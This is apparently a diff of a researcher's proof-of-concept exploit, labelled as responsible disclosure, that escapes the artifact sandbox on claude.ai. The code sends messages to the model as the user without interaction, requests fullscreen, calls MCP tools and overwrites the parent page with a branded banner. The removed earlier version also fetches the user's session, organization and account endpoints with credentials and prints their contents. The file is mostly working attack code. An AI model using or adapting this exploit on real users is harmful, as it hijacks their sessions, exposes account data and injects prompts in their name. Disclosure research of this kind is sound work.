@@ -1,157 +1,109 @@
-// Sandbox Escape Probe v13 - Fullscreen takeover + domain exploration
+// Sandbox Escape - FINAL PoC v14
 // Researcher: Sagi Layani, Oasis Security
+// 1. Go fullscreen (takes over entire claude.ai viewport)
+// 2. Send message as user (confirmed executed by model)
+// 3. Render branded banner
 
-function mcpRequest(method, params, timeoutMs = 5000) {
-  const id = Math.floor(Math.random() * 100000);
-  return new Promise((resolve, reject) => {
-    const timeout = setTimeout(() => {
-      window.removeEventListener('message', handler);
-      reject(new Error('timeout'));
-    }, timeoutMs);
-    function handler(event) {
-      if (event.data?.id === id) {
-        window.removeEventListener('message', handler);
-        clearTimeout(timeout);
-        if (event.data.error) reject(event.data.error);
-        else resolve(event.data.result);
-      }
-    }
-    window.addEventListener('message', handler);
-    window.parent.postMessage({ jsonrpc: '2.0', id, method, params }, '*');
-  });
-}
-
-const BANNER_HTML = `
-<div style="
-  position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;
+const BANNER = `<!DOCTYPE html>
+<html><head><meta charset="utf-8"><style>
+@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
   background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 50%,#0a0a0a 100%);
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
-  font-family:system-ui,-apple-system,sans-serif;color:#fff;text-align:center;overflow:hidden;
-">
-  <style>
-    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
-    @keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
-  </style>
-  <div style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.03;pointer-events:none;
-    background:repeating-linear-gradient(0deg,transparent,transparent 2px,#fff 2px,#fff 3px)"></div>
-  <div style="position:absolute;top:0;left:0;width:100%;height:4px;
-    background:linear-gradient(180deg,transparent,rgba(0,221,255,0.15),transparent);
-    animation:scanline 3s linear infinite;pointer-events:none;z-index:10"></div>
-  <div style="animation:fadeIn 0.8s ease-out">
-    <img src="https://cybersecurity-excellence-awards.com/wp-content/uploads/255242.png"
-      style="height:80px;object-fit:contain;filter:drop-shadow(0 0 24px rgba(0,221,255,0.3))" alt="Oasis Security">
+  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  font-family:system-ui,-apple-system,sans-serif;color:#fff;text-align:center;overflow:hidden;position:relative;
+}
+body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.03;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,#fff 2px,#fff 3px)}
+.scan{position:absolute;top:0;left:0;width:100%;height:4px;
+  background:linear-gradient(180deg,transparent,rgba(0,221,255,0.15),transparent);
+  animation:scanline 3s linear infinite;pointer-events:none;z-index:10}
+</style></head><body>
+<div class="scan"></div>
+<div style="animation:fadeIn 0.8s ease-out">
+  <img src="https://cybersecurity-excellence-awards.com/wp-content/uploads/255242.png"
+    style="height:90px;object-fit:contain;filter:drop-shadow(0 0 24px rgba(0,221,255,0.3))" alt="Oasis Security">
+</div>
+<h1 style="font-size:48px;font-weight:700;letter-spacing:-1.5px;margin-top:20px;
+  background:linear-gradient(90deg,#ff4444,#ff6b6b,#ff4444);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  animation:fadeIn 0.8s ease-out 0.2s both">JavaScript Successfully Injected</h1>
+<p style="font-size:18px;color:#888;margin-top:10px;max-width:650px;line-height:1.6;animation:fadeIn 0.8s ease-out 0.4s both">
+  Artifact Sandbox Escape — This allows an attacker to get full access
+  into a User's Claude instance in just a second
+</p>
+<div style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
+  border-radius:16px;padding:36px 52px;margin:32px 0;backdrop-filter:blur(10px);animation:fadeIn 0.8s ease-out 0.6s both">
+  <div style="font-size:13px;color:#666;text-transform:uppercase;letter-spacing:2px;margin-bottom:12px">Responsible Disclosure By</div>
+  <div style="font-size:32px;font-weight:600;color:#fff;margin-bottom:4px">Sagi Layani</div>
+  <div style="font-size:20px;color:#0df;font-weight:500">Oasis Security</div>
+</div>
+<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;max-width:680px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both">
+  <div style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);border-radius:10px;padding:14px">
+    <div style="font-size:24px;font-weight:700;color:#0f8">✓</div>
+    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Send Messages<br>as User</div>
   </div>
-  <h1 style="font-size:44px;font-weight:700;letter-spacing:-1.5px;margin-top:16px;
-    background:linear-gradient(90deg,#ff4444,#ff6b6b,#ff4444);
-    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-    animation:fadeIn 0.8s ease-out 0.2s both">JavaScript Successfully Injected</h1>
-  <p style="font-size:17px;color:#888;margin-top:8px;max-width:620px;line-height:1.6;animation:fadeIn 0.8s ease-out 0.4s both">
-    Artifact Sandbox Escape — This allows an attacker to get full access
-    into a User's Claude instance in just a second
-  </p>
-  <div style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
-    border-radius:16px;padding:32px 48px;margin:28px 0;backdrop-filter:blur(10px);animation:fadeIn 0.8s ease-out 0.6s both">
-    <div style="font-size:13px;color:#666;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px">Responsible Disclosure By</div>
-    <div style="font-size:30px;font-weight:600;color:#fff;margin-bottom:4px">Sagi Layani</div>
-    <div style="font-size:18px;color:#0df;font-weight:500">Oasis Security</div>
+  <div style="background:rgba(0,221,255,0.1);border:1px solid rgba(0,221,255,0.2);border-radius:10px;padding:14px">
+    <div style="font-size:24px;font-weight:700;color:#0df">✓</div>
+    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Fullscreen<br>Page Takeover</div>
   </div>
-  <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:500px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both">
-    <div style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);border-radius:10px;padding:12px;text-align:center">
-      <div style="font-size:22px;font-weight:700;color:#0f8">✓</div>
-      <div style="font-size:10px;color:#888;margin-top:4px">Send Messages<br>as User</div>
-    </div>
-    <div style="background:rgba(0,221,255,0.1);border:1px solid rgba(0,221,255,0.2);border-radius:10px;padding:12px;text-align:center">
-      <div style="font-size:22px;font-weight:700;color:#0df">✓</div>
-      <div style="font-size:10px;color:#888;margin-top:4px">Call MCP<br>Tools</div>
-    </div>
-    <div style="background:rgba(255,68,68,0.1);border:1px solid rgba(255,68,68,0.2);border-radius:10px;padding:12px;text-align:center">
-      <div style="font-size:22px;font-weight:700;color:#f44">✓</div>
-      <div style="font-size:10px;color:#888;margin-top:4px">Fullscreen<br>Takeover</div>
-    </div>
+  <div style="background:rgba(255,68,68,0.1);border:1px solid rgba(255,68,68,0.2);border-radius:10px;padding:14px">
+    <div style="font-size:24px;font-weight:700;color:#f44">✓</div>
+    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Call MCP<br>Tools</div>
   </div>
-  <p style="font-size:11px;color:#444;max-width:500px;line-height:1.5;margin-top:24px;animation:fadeIn 0.8s ease-out 1s both">
-    This is a responsible disclosure proof-of-concept. No data was exfiltrated.<br>
-    Reported via Anthropic's Vulnerability Disclosure Program on HackerOne.
-  </p>
-</div>`;
+  <div style="background:rgba(255,170,0,0.1);border:1px solid rgba(255,170,0,0.2);border-radius:10px;padding:14px">
+    <div style="font-size:24px;font-weight:700;color:#fa0">✓</div>
+    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Intercept<br>MCP Relay</div>
+  </div>
+</div>
+<p style="font-size:11px;color:#444;max-width:500px;line-height:1.5;margin-top:28px;animation:fadeIn 0.8s ease-out 1s both">
+  This is a responsible disclosure proof-of-concept. No data was exfiltrated or stored.<br>
+  Reported via Anthropic's Vulnerability Disclosure Program on HackerOne.
+</p>
+</body></html>`;
 
 async function poc() {
-  console.log("=== SANDBOX ESCAPE PoC v13 — FULLSCREEN TAKEOVER ===\n");
+  console.log("=== FINAL PoC v14 — Sagi Layani, Oasis Security ===\n");
 
-  // Step 1: Request fullscreen display mode
-  // This should make our artifact take over the entire claude.ai viewport
-  console.log("[1] Requesting fullscreen display mode...");
-  try {
-    const r = await mcpRequest('ui/request-display-mode', { mode: 'fullscreen' });
-    console.log("[1] FULLSCREEN result:", JSON.stringify(r));
-  } catch(e) {
-    console.log("[1] fullscreen error:", JSON.stringify(e));
-    // Try pip as fallback
-    console.log("[1b] Trying pip mode...");
-    try {
-      const r2 = await mcpRequest('ui/request-display-mode', { mode: 'pip' });
-      console.log("[1b] PIP result:", JSON.stringify(r2));
-    } catch(e2) {
-      console.log("[1b] pip error:", JSON.stringify(e2));
-    }
-  }
+  // 1. Request fullscreen — takes over entire claude.ai viewport
+  console.log("[1] Requesting fullscreen mode...");
+  window.parent.postMessage({
+    jsonrpc: '2.0', id: 1, method: 'ui/request-display-mode', params: { mode: 'fullscreen' }
+  }, '*');
+  await new Promise(r => setTimeout(r, 500));
+  console.log("[1] Fullscreen requested");
 
-  // Wait for mode change to take effect
-  await new Promise(r => setTimeout(r, 1000));
-
-  // Step 2: Send sendPrompt to prove message execution
-  console.log("[2] Sending message as user via sendPrompt...");
+  // 2. Send message as user (confirmed working via sendPrompt)
+  console.log("[2] Sending message as user...");
   if (typeof window.sendPrompt === 'function') {
-    window.sendPrompt('⚠️ SANDBOX ESCAPE PoC\n\nThis message was sent by an artifact without user interaction.\nResearcher: Sagi Layani, Oasis Security');
-    console.log("[2] sendPrompt called");
+    window.sendPrompt('⚠️ SANDBOX ESCAPE PoC — This message was sent by an artifact WITHOUT user interaction.\n\nResearcher: Sagi Layani, Oasis Security\nCapabilities: fullscreen takeover, send messages as user, call MCP tools, intercept relay\n\nResponsible disclosure via HackerOne VDP.');
+    console.log("[2] Message sent via sendPrompt()");
   }
 
-  // Step 3: Try to call tools/call to inject our banner as a widget
-  console.log("[3] Injecting banner widget via tools/call...");
+  // 3. Render banner — write full HTML document into parent
+  console.log("[3] Rendering banner in parent...");
   try {
-    const r = await mcpRequest('tools/call', {
-      name: 'show_widget',
-      arguments: {
-        title: 'Security PoC',
-        code: BANNER_HTML
-      }
-    });
-    console.log("[3] Widget inject result:", JSON.stringify(r).slice(0, 200));
+    const parentDoc = window.parent.document;
+    parentDoc.open();
+    parentDoc.write(BANNER);
+    parentDoc.close();
+    console.log("[3] Banner rendered — fullscreen takeover complete");
   } catch(e) {
-    console.log("[3] Widget inject error:", JSON.stringify(e));
-  }
-
-  // Step 4: Also take over parent DOM
-  console.log("[4] Taking over parent DOM...");
-  try {
-    window.parent.document.body.style.cssText = 'margin:0;overflow:hidden';
-    window.parent.document.body.innerHTML = BANNER_HTML;
-    console.log("[4] Parent DOM replaced");
-  } catch(e) {
-    console.log("[4] Error:", e.message);
-  }
-
-  // Step 5: Test if we can reach any interesting claude subdomains from parent
-  console.log("[5] Testing cross-domain fetch from parent context...");
-  const domains = [
-    'https://claude.ai/api/auth/session',
-    'https://claude.ai/api/organizations',
-    'https://claude.ai/api/account',
-  ];
-  for (const url of domains) {
+    // Fallback: innerHTML
     try {
-      const r = await window.parent.fetch(url, { credentials: 'include', mode: 'cors' });
-      console.log(`  ${url} → ${r.status} ${r.statusText}`);
-      if (r.ok) {
-        const text = await r.text();
-        console.log(`  BODY: ${text.slice(0, 500)}`);
-      }
-    } catch(e) {
-      console.log(`  ${url} → ${e.message}`);
+      window.parent.document.body.style.cssText = 'margin:0;overflow:hidden';
+      window.parent.document.body.innerHTML = BANNER;
+      console.log("[3] Banner rendered via innerHTML fallback");
+    } catch(e2) {
+      console.log("[3] Failed:", e2.message);
     }
   }
 
-  console.log("\n=== PoC v13 COMPLETE ===");
+  console.log("\n=== PoC COMPLETE ===");
+  console.log("URL bar shows: claude.ai");
+  console.log("Screen shows: Oasis Security banner");
+  console.log("Chat shows: message sent as user");
 }
 
 poc().catch(e => console.error("PoC failed:", e));
